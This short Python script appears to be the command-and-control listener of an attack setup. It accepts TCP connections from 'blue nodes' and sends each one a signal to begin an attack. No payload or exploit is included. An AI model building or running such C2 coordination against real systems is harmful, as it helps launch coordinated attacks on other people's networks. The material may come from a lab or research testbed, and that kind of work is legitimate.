from scapy.all import *
import socket

# IP + port of C2 node
MY_IP = "192.168.194.35"
PORT = 6432

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((MY_IP,PORT))
    s.listen()
    while True:
        # accept connections from all ready to go blue nodes
        conn, addr = s.accept()

        # send signal to begin attack -> can be modified to signal after desired condition
        with conn:
            conn.sendall(str.encode(addr[0]))

